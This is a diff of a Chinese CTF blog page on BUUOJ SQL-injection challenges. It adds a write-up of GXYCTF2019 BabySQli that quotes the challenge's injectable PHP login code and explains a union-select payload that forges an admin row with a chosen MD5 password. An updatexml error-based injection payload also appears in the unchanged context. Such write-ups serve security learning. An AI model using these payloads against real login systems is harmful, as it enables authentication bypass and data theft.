@@ -32,10 +32,16 @@
 <meta property="og:image" content="https://sunzhengyu99.github.io/2020/10/05/buuoj/2.png">
 <meta property="og:image" content="https://sunzhengyu99.github.io/2020/10/05/buuoj/%E8%BF%87%E6%BB%A4.png">
 <meta property="og:image" content="https://sunzhengyu99.github.io/2020/10/05/buuoj/flag1.png">
+<meta property="og:image" content="https://sunzhengyu99.github.io/2020/10/05/buuoj/sqli1.png">
+<meta property="og:image" content="https://sunzhengyu99.github.io/2020/10/05/buuoj/sqli3.png">
+<meta property="og:image" content="https://sunzhengyu99.github.io/2020/10/05/buuoj/sqli2.png">
+<meta property="og:image" content="https://sunzhengyu99.github.io/2020/10/05/buuoj/sqli.png">
 <meta property="article:published_time" content="2020-10-05T10:29:30.000Z">
-<meta property="article:modified_time" content="2020-10-05T15:47:58.592Z">
+<meta property="article:modified_time" content="2020-10-07T13:22:06.794Z">
 <meta property="article:author" content="sunzy">
-<meta property="article:tag" content="盲注">
+<meta property="article:tag" content="二分注入">
+<meta property="article:tag" content="报错注入">
+<meta property="article:tag" content="union新姿势">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://sunzhengyu99.github.io/2020/10/05/buuoj/fuzz.png">
 
@@ -133,12 +139,12 @@
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">34</span></a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">36</span></a>
 
   </li>
         <li class="menu-item menu-item-categories">
 
-    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">9</span></a>
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">10</span></a>
 
   </li>
         <li class="menu-item menu-item-archives">
@@ -226,17 +232,23 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2020-10-05 18:29:30 / 修改时间：23:47:58" itemprop="dateCreated datePublished" datetime="2020-10-05T18:29:30+08:00">2020-10-05</time>
+              <time title="创建时间：2020-10-05 18:29:30" itemprop="dateCreated datePublished" datetime="2020-10-05T18:29:30+08:00">2020-10-05</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-10-07 21:22:06" itemprop="dateModified" datetime="2020-10-07T21:22:06+08:00">2020-10-07</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+                  <a href="/categories/buuoj/" itemprop="url" rel="index"><span itemprop="name">buuoj</span></a>
                 </span>
             </span>
 
@@ -267,7 +279,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>2.1k</span>
+              <span>3.9k</span>
             </span>
 
         </div>
@@ -320,6 +332,45 @@
 <figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=admin&amp;password=dad%<span class="number">27</span><span class="keyword">or</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select(right(password,<span class="number">30</span>))<span class="keyword">from</span>(geek.H4rDsq1)),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span></span><br></pre></td></tr></table></figure>
 
 
+
+<h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><p>sql注入+反序列化+代码审计</p>
+<h1 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h1><p>下载的源码，有助于后面做题</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">mysqli_query($con,<span class="string">'SET NAMES UTF8'</span>);</span><br><span class="line">$name = $_POST[<span class="string">'name'</span>];</span><br><span class="line">$password = $_POST[<span class="string">'pw'</span>];</span><br><span class="line">$t_pw = md5($password);     <span class="comment">//对传入的password参数进行了md5加密</span></span><br><span class="line">$sql = <span class="string">"select * from user where username = '"</span>.$name.<span class="string">"'"</span>;</span><br><span class="line"><span class="comment">// echo $sql;</span></span><br><span class="line">$result = mysqli_query($con, $sql);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/\(|\)|\=|or/"</span>, $name))&#123;  <span class="comment">//  过滤了() | = or </span></span><br><span class="line">	<span class="keyword">die</span>(<span class="string">"do not hack me!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!$result) &#123;</span><br><span class="line">		printf(<span class="string">"Error: %s\n"</span>, mysqli_error($con));</span><br><span class="line">		<span class="keyword">exit</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="comment">// echo '&lt;pre&gt;';</span></span><br><span class="line">		$arr = mysqli_fetch_row($result);</span><br><span class="line">		<span class="comment">// print_r($arr);</span></span><br><span class="line">		<span class="keyword">if</span>($arr[<span class="number">1</span>] == <span class="string">"admin"</span>)&#123;</span><br><span class="line">			<span class="keyword">if</span>(md5($password) == $arr[<span class="number">2</span>])&#123;    <span class="comment">//</span></span><br><span class="line">				<span class="keyword">echo</span> $flag;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">die</span>(<span class="string">"wrong pass!"</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">"wrong user!"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>随便输入用户名和密码，查看源码，出现提示</p>
+<p><img src="/2020/10/05/buuoj/sqli1.png" alt></p>
+<p>试了试应该是base32，解码后是base64</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c<span class="number">2</span><span class="attr">VsZWN0</span>ICogZ<span class="symbol">nJvbSB1</span>c<span class="number">2</span>VyIHdoZXJlIHVzZXJuYW<span class="number">1</span>lID<span class="number">0</span>gJyRuYW<span class="number">1</span>lJw==</span><br></pre></td></tr></table></figure>
+
+<p>继续解码</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span><span class="built_in"> user </span>where username = <span class="string">'$name'</span></span><br></pre></td></tr></table></figure>
+
+<p>注入点是name参数这里，与上面源码中的查询语句一样。</p>
+<p>经过测试发现有三列，<code>name=admin&#39; union select 1,2,3 #&amp;pw=as#</code>显示正常，<code>name=admn&#39; union select 1,2,3,4#&amp;pw=as</code>报错</p>
+<p>但是页面没有数字回显，所以常规的注入应该是不行的。</p>
+<p>值得注意的是，这题可以知道username是admin，</p>
+<p>输入username=admin&amp;password=11,时提示wrong pass!</p>
+<p>输入username=admn&amp;password=11,时提示wrong user!，所以可以判断用户名为admin</p>
+<p>接下来介绍一种新的union注入</p>
+<p>先建立一张表</p>
+<p><img src="/2020/10/05/buuoj/sqli3.png" alt></p>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * from test where id=<span class="number">0</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> 1,'<span class="title">admin</span>','2322';</span></span><br></pre></td></tr></table></figure>
+
+<p>union语句后查询的是表中不存在的一个数据，查询结果如下</p>
+<p><img src="/2020/10/05/buuoj/sqli2.png" alt></p>
+<p><strong>这个结果说明，union查询一个不存在的数据时，会建立一个虚拟表</strong>，其中放着所查询到的数据和union后包含的数据</p>
+<p>这里就是 id=1,username=admin,password=2322</p>
+<p>这样就可以利用这个改变数据库中用户的密码，然后用自己设置的密码登录</p>
+<p>接下来，利用这点做这个题目，首先知道一共三列，第一列应该是id，知道之后两列的内容就可以了</p>
+<p><code>name=adm&#39; union select 1,&#39;a&#39;,&#39;s&#39; #&amp;pw=11</code>提示的wrong user!</p>
+<p><code>name=adm&#39; union select 1,&#39;admin&#39;,&#39;s&#39; #&amp;pw=11</code>提示的wrong pass!</p>
+<p>第二列的字段名应该就是username，第三列自然就是password，但是这题的password字段存放的时md5加密后的内容<strong>（看到师傅们的wp才知道的，看到源码也确实这样，但是在比赛的时候这么发现不得而知）</strong></p>
+<p>payload:</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">name</span>=000'union select 1,<span class="string">'admin'</span>,<span class="string">'b59c67bf196a4758191e42f76670ceba'</span>#&amp;<span class="attribute">pw</span>=1111</span><br></pre></td></tr></table></figure>
+
+<p><code>b59c67bf196a4758191e42f76670ceba</code>是1111的md5值，pw的值为1111</p>
+<p><img src="/2020/10/05/buuoj/sqli.png" alt></p>
+
     </div>
     <div>
       
@@ -339,7 +390,9 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/%E7%9B%B2%E6%B3%A8/" rel="tag"># 盲注</a>
+              <a href="/tags/%E4%BA%8C%E5%88%86%E6%B3%A8%E5%85%A5/" rel="tag"># 二分注入</a>
+              <a href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" rel="tag"># 报错注入</a>
+              <a href="/tags/union%E6%96%B0%E5%A7%BF%E5%8A%BF/" rel="tag"># union新姿势</a>
           </div>
 
         
@@ -411,7 +464,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#buuoj–注入篇"><span class="nav-number">1.</span> <span class="nav-text">buuoj–注入篇</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN2019-华北赛区-Day2-Web1-Hack-World"><span class="nav-number">1.1.</span> <span class="nav-text">[CISCN2019 华北赛区 Day2 Web1]Hack World</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#极客大挑战-2019-HardSQL"><span class="nav-number">1.2.</span> <span class="nav-text">[极客大挑战 2019]HardSQL</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#buuoj–注入篇"><span class="nav-number">1.</span> <span class="nav-text">buuoj–注入篇</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN2019-华北赛区-Day2-Web1-Hack-World"><span class="nav-number">1.1.</span> <span class="nav-text">[CISCN2019 华北赛区 Day2 Web1]Hack World</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#极客大挑战-2019-HardSQL"><span class="nav-number">1.2.</span> <span class="nav-text">[极客大挑战 2019]HardSQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#网鼎杯-2018-Fakebook"><span class="nav-number">1.3.</span> <span class="nav-text">[网鼎杯 2018]Fakebook</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#GXYCTF2019-BabySQli"><span class="nav-number">2.</span> <span class="nav-text">[GXYCTF2019]BabySQli</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -434,13 +487,13 @@
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-count">10</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">34</span>
+        <span class="site-state-item-count">36</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -486,7 +539,7 @@
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">65k</span>
+    <span title="站点总字数">67k</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
